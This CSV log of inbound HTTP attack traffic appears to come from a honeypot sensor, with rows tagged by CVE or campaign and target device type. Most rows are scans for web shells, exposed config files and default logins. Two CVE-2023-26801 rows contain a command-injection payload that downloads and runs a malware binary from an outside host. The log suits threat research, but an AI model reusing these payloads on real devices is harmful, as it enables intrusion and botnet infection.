local_ip,remote_ip,remote_port,local_port,tag_label,attack_time,target_profile,node_id,ASN,attack_data,method,path,User-Agent,Accept-Encoding,Accept,Qualys-Scan,Content-Length,Content-Type,Referrer,Host,body
15.0.2.3,81.199.17.49,42346,80,CID-1289,2023-11-01T07:12:37,device:iot:IPCamera:AXIS-IPCamera,536,AS12491,"{'method': 'GET', 'path': '/%69%73%70%69%72%69%74/%69%6D/%75%70%6C%6F%61%64%2E%70%68%70/help.php/java.php/_query.php/test.php/db_cts.php/db_pma.php/logon.php/help-e.php/license.php/log.php/hell.php/pmd_online.php/x.php/shell.php/htdocs.php/b.php/sane.php/desktop.ini.php/z.php/lala.php/lala-dpr.php/wpc.php/wpo.php/t6nv.php/muhstik.php/text.php/wp-config.php/muhstik.php/muhstik2.php/muhstiks.php/muhstik-dpr.php/lol.php', 'headers': {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0', 'Host': '223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45', 'Connection': 'Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive, Keep-Alive', 'Cache-Control': 'no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache, no-cache'}}",GET,/%69%73%70%69%72%69%74/%69%6D/%75%70%6C%6F%61%64%2E%70%68%70/help.php/java.php/_query.php/test.php/db_cts.php/db_pma.php/logon.php/help-e.php/license.php/log.php/hell.php/pmd_online.php/x.php/shell.php/htdocs.php/b.php/sane.php/desktop.ini.php/z.php/lala.php/lala-dpr.php/wpc.php/wpo.php/t6nv.php/muhstik.php/text.php/wp-config.php/muhstik.php/muhstik2.php/muhstiks.php/muhstik-dpr.php/lol.php,"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0, Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0",,,,,,,"223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45, 223.30.229.45",
117.205.67.158,89.190.156.170,39522,8080,CVE-2023-26801,2023-11-01T08:53:12,device:web:server:Apache,422,AS49870,"{'method': 'POST', 'path': '/goform/set_LimitClient_cfg', 'headers': {'Host': '117.205.67.158:8080', 'User-Agent': 'Go-http-client/1.1', 'Content-Length': '201', 'Cookie': 'user=admin', 'Accept-Encoding': 'gzip'}, 'body': b'dGltZTE9MDA6MDAtMDA6MDAmdGltZTI9MDA6MDAtMDA6MDAmbWFjPTtraWxsYWxsIC05IC9iaW4vc2g7IGtpbGxhbGwgLTkgL3ovYmluOyBraWxsYWxsIC05IC9iaW4vYmFzaDsgcm0gLXJmICptcHNsKjsgd2dldCBodHRwOi8vYm9hdHMuZG9nbXVuY2hlci54eXovQXF1YS5tcHNsOyBjaG1vZCA3NzcgQXF1YS5tcHNsOyAuL0FxdWEubXBzbCBsYmxpbms7'}",POST,/goform/set_LimitClient_cfg,Go-http-client/1.1,gzip,,,201,,,117.205.67.158:8080,time1=00:00-00:00&time2=00:00-00:00&mac=;killall -9 /bin/sh; killall -9 /z/bin; killall -9 /bin/bash; rm -rf *mpsl*; wget http://boats.dogmuncher.xyz/Aqua.mpsl; chmod 777 Aqua.mpsl; ./Aqua.mpsl lblink;
10.22.44.5,80.82.77.33,45176,80,CID-1319,2023-11-01T09:01:08,device:iot:IPCamera:Hikvision,292,AS202425,"{'method': 'GET', 'path': '/tmpfs/auto.jpg', 'headers': {'Host': '202.176.0.26', 'Connection': 'keep-alive', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36'}}",GET,/tmpfs/auto.jpg,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36","gzip, deflate",*/*,,,,,202.176.0.26,
10.22.44.5,80.82.77.33,45176,80,CID-1319,2023-11-01T09:01:08,device:iot:IPCamera:Hikvision,292,AS202425,"{'method': 'GET', 'path': '/img/snapshot.cgi?size=2', 'headers': {'Host': '202.176.0.26', 'Connection': 'keep-alive', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36'}}",GET,/img/snapshot.cgi?size=2,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36","gzip, deflate",*/*,,,,,202.176.0.26,
164.100.138.189,89.190.156.170,44652,8080,CVE-2023-26801,2023-11-01T08:10:09,device:web:server:Apache,218,AS49870,"{'method': 'POST', 'path': '/goform/set_LimitClient_cfg', 'headers': {'Host': '164.100.138.189:8080', 'User-Agent': 'Go-http-client/1.1', 'Content-Length': '201', 'Cookie': 'user=admin', 'Accept-Encoding': 'gzip'}, 'body': b'dGltZTE9MDA6MDAtMDA6MDAmdGltZTI9MDA6MDAtMDA6MDAmbWFjPTtraWxsYWxsIC05IC9iaW4vc2g7IGtpbGxhbGwgLTkgL3ovYmluOyBraWxsYWxsIC05IC9iaW4vYmFzaDsgcm0gLXJmICptcHNsKjsgd2dldCBodHRwOi8vYm9hdHMuZG9nbXVuY2hlci54eXovQXF1YS5tcHNsOyBjaG1vZCA3NzcgQXF1YS5tcHNsOyAuL0FxdWEubXBzbCBsYmxpbms7'}",POST,/goform/set_LimitClient_cfg,Go-http-client/1.1,gzip,,,201,,,164.100.138.189:8080,time1=00:00-00:00&time2=00:00-00:00&mac=;killall -9 /bin/sh; killall -9 /z/bin; killall -9 /bin/bash; rm -rf *mpsl*; wget http://boats.dogmuncher.xyz/Aqua.mpsl; chmod 777 Aqua.mpsl; ./Aqua.mpsl lblink;
172.16.16.65,45.81.34.170,49238,9200,CID-984,2023-11-01T08:22:09,device:web:database:elasticsearch,428,AS328543,"{'method': 'HEAD', 'path': '/', 'headers': {'Host': '103.58.121.65:9200', 'User-Agent': 'Go-http-client/1.1'}}",HEAD,/,Go-http-client/1.1,,,,,,,103.58.121.65:9200,
10.0.176.23,64.225.96.115,57456,80,CID-980,2023-11-01T10:09:11,device:iot:IPCamera:Hikvision,89,AS14061,"{'method': 'GET', 'path': '/bundle.js', 'headers': {'Host': '103.160.128.203', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', 'Accept': '*/*', 'Accept-Encoding': 'gzip'}}",GET,/bundle.js,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",gzip,*/*,,,,,103.160.128.203,
182.78.51.163,212.192.14.201,60304,80,CVE-2020-8958,2023-11-01T12:38:04,device:iot:Printer:Kyocera,304,AS207713,"{'method': 'POST', 'path': '/boaform/admin/formLogin', 'headers': {'Host': '182.78.51.163:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '29', 'Origin': 'http://182.78.51.163:80', 'Connection': 'keep-alive', 'Referer': 'http://182.78.51.163:80/admin/login.asp', 'Upgrade-Insecure-Requests': '1'}, 'body': b'dXNlcm5hbWU9YWRtaW4mcHNkPUZlZWZpZm9mdW0='}",POST,/boaform/admin/formLogin,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",,29,application/x-www-form-urlencoded,,182.78.51.163:80,username=admin&psd=Feefifofum
115.248.40.67,35.216.250.8,50544,80,CID-1018,2023-11-01T11:04:09,device:iot:Printer:Canon,328,AS15169,"{'method': 'GET', 'path': '/.git/config', 'headers': {'Host': '115.248.40.67', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0 abuse.xmco.fr', 'Accept-Encoding': 'gzip', 'Connection': 'close'}}",GET,/.git/config,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0 abuse.xmco.fr,gzip,,,,,,115.248.40.67,
43.229.100.243,103.75.173.4,49119,9200,CID-1332,2023-11-01T04:29:11,device:web:database:elasticsearch,435,AS27385,"{'method': 'GET', 'path': '/cgi-bin/formmailto.html', 'headers': {'Host': '43.229.100.243:9200', 'Connection': 'Keep-Alive', 'Qualys-Scan': 'VM'}}",GET,/cgi-bin/formmailto.html,,,,VM,,,,43.229.100.243:9200,
43.229.100.243,103.75.173.4,49119,9200,CID-1332,2023-11-01T04:29:11,device:web:database:elasticsearch,435,AS27385,"{'method': 'GET', 'path': '/cgi-bin', 'headers': {'Connection': 'Keep-Alive', 'Qualys-Scan': 'VM'}}",GET,/cgi-bin,,,,VM,,,,,
43.229.100.243,103.75.173.4,49527,9200,CID-1373,2023-11-01T04:29:41,device:web:database:elasticsearch,435,AS27385,"{'method': 'GET', 'path': '/phorum-3.3.1a/', 'headers': {'Host': '43.229.100.243:9200', 'Connection': 'Keep-Alive', 'Qualys-Scan': 'VM'}}",GET,/phorum-3.3.1a/,,,,VM,,,,43.229.100.243:9200,
14.142.138.157,62.210.100.24,34936,8080,CVE-2018-20062,2023-11-01T05:44:00,device:web:server:Apache,296,AS12876,"{'method': 'GET', 'path': '/_vti_inf.html', 'headers': {'Host': '14.142.138.157:8080', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Connection': 'close', 'Accept': '*/*', 'Accept-Language': 'en', 'X-Scanned-By': 'RecordedFuture-ASI', 'X-Scanning-Id': 'cb4fd6c2-0a6b-4707-9b88-0691d03e3ea9 586b0abe-84ad-49a7-b1e0-e7c6852b4d94', 'Accept-Encoding': 'gzip'}}",GET,/_vti_inf.html,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36",gzip,*/*,,,,,14.142.138.157:8080,
14.142.138.157,62.210.100.24,34936,8080,CVE-2018-20062,2023-11-01T05:44:00,device:web:server:Apache,296,AS12876,"{'method': 'GET', 'path': '/level/16/exec/show/config/CR', 'headers': {'Host': '14.142.138.157:8080', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Connection': 'close', 'Accept': '*/*', 'Accept-Language': 'en', 'X-Scanned-By': 'RecordedFuture-ASI', 'X-Scanning-Id': 'cb4fd6c2-0a6b-4707-9b88-0691d03e3ea9 586b0abe-84ad-49a7-b1e0-e7c6852b4d94', 'Accept-Encoding': 'gzip'}}",GET,/level/16/exec/show/config/CR,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36",gzip,*/*,,,,,14.142.138.157:8080,
14.142.138.157,62.210.100.24,34936,8080,CVE-2018-20062,2023-11-01T05:44:00,device:web:server:Apache,296,AS12876,"{'method': 'GET', 'path': '/api/v1/GetDevice', 'headers': {'Host': '14.142.138.157:8080', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Connection': 'close', 'Accept': '*/*', 'Accept-Language': 'en', 'X-Scanned-By': 'RecordedFuture-ASI', 'X-Scanning-Id': 'cb4fd6c2-0a6b-4707-9b88-0691d03e3ea9 586b0abe-84ad-49a7-b1e0-e7c6852b4d94', 'Accept-Encoding': 'gzip'}}",GET,/api/v1/GetDevice,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36",gzip,*/*,,,,,14.142.138.157:8080,
14.142.138.157,62.210.100.24,34936,8080,CVE-2018-20062,2023-11-01T05:44:00,device:web:server:Apache,296,AS12876,"{'method': 'GET', 'path': '/sap/bc/BSp/sap/menu/fameset.htm?sap--essioncmd=close&sapexiturl=https%3a%2f%2finteract.sh', 'headers': {'Host': '14.142.138.157:8080', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Connection': 'close', 'Accept': '*/*', 'Accept-Language': 'en', 'X-Scanned-By': 'RecordedFuture-ASI', 'X-Scanning-Id': 'cb4fd6c2-0a6b-4707-9b88-0691d03e3ea9 586b0abe-84ad-49a7-b1e0-e7c6852b4d94', 'Accept-Encoding': 'gzip'}}",GET,/sap/bc/BSp/sap/menu/fameset.htm?sap--essioncmd=close&sapexiturl=https%3a%2f%2finteract.sh,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36",gzip,*/*,,,,,14.142.138.157:8080,
172.29.168.104,94.102.49.193,58710,80,CVE-2017-6884,2023-11-01T09:50:30,device:scada:plc:Delta_Electronics,345,AS202425,"{'method': 'GET', 'path': '/cgi-bin/luci', 'headers': {'Accept-Encoding': 'identity', 'Host': '223.31.163.154', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'}}",GET,/cgi-bin/luci,"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",identity,"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",,,,,223.31.163.154,
10.6.1.7,64.176.37.32,54638,80,CID-1328,2023-11-01T10:15:52,device:iot:IPCamera:Avtech,405,AS20473,"{'method': 'GET', 'path': '/actuator/gateway/globalfilters', 'headers': {'Host': '103.138.197.92:80', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36', 'Accept': 'text/html,*/*;', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept-Encoding': 'gzip', 'Connection': 'close'}}",GET,/actuator/gateway/globalfilters,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",gzip,"text/html,*/*;",,,application/x-www-form-urlencoded; charset=UTF-8,,103.138.197.92:80,
117.255.218.88,109.237.98.226,37572,80,CID-1028,2023-11-01T01:05:38,device:scada:plc:Delta_Electronics,150,AS202306,"{'method': 'POST', 'path': '/info.php', 'headers': {'Host': '117.255.218.88', 'User-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Content-Length': '20', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': b'MHglNUIlNUQ9YW5kcm94Z2gwc3Q='}",POST,/info.php,,"gzip, deflate",*/*,,20,application/x-www-form-urlencoded,,117.255.218.88,0x%5B%5D=androxgh0st
